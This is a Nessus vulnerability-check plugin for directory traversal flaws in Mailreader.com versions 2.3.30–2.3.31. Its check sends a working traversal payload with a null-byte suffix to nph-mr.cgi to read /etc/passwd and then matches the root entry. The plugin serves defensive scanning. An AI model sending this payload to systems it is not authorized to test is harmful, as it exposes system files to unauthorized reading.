#
# (C) Tenable Network Security, Inc.
#

# References:
# Date: Mon, 28 Oct 2002 17:48:04 +0800
# From: "pokleyzz" <pokleyzz@scan-associates.net>
# To: "bugtraq" <bugtraq@securityfocus.com>, 
#  "Shaharil Abdul Malek" <shaharil@scan-associates.net>, 
#  "sk" <sk@scan-associates.net>, "pokley" <saleh@scan-associates.net>, 
#  "Md Nazri Ahmad" <nazri@ns1.scan-associates.net> 
# Subject: SCAN Associates Advisory : Multiple vurnerabilities on mailreader.com
#

include("compat.inc");

if(description)
{
  script_id(11780);
  script_version("$Revision: 1.21 $");
  script_cve_id("CVE-2002-1581", "CVE-2002-1582");
  script_bugtraq_id(5393, 6055, 6058);
  script_osvdb_id(8192, 16018);

  script_name(english:"Mailreader 2.3.30 - 2.3.31 Multiple Vulnerabilities");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to access arbitrary file on the remote host." );
 script_set_attribute(attribute:"description", value:
"Mailreader.com software is installed. A directory traversal flaw 
allows anybody to read arbitrary files on your system." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to v2.3.32 or later" );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/06/26");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/10/28");
 script_cvs_date("$Date: 2016/11/28 21:06:39 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_summary(english:"Checks directory traversal & version number of mailreader.com software");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");
  script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (make_list(cgi_dirs()))
{
  w = http_send_recv3(method:"GET", port: port, item: strcat(dir, "/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00"));
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  r2 = strcat(w[0], w[1], '\r\n', w[2]);
  
  if ("Powered by Mailreader.com" >< r2 && r2 =~ "root:[^:]*:0:[01]:")
  {
   security_warning(port);
   exit(0);
  }
}

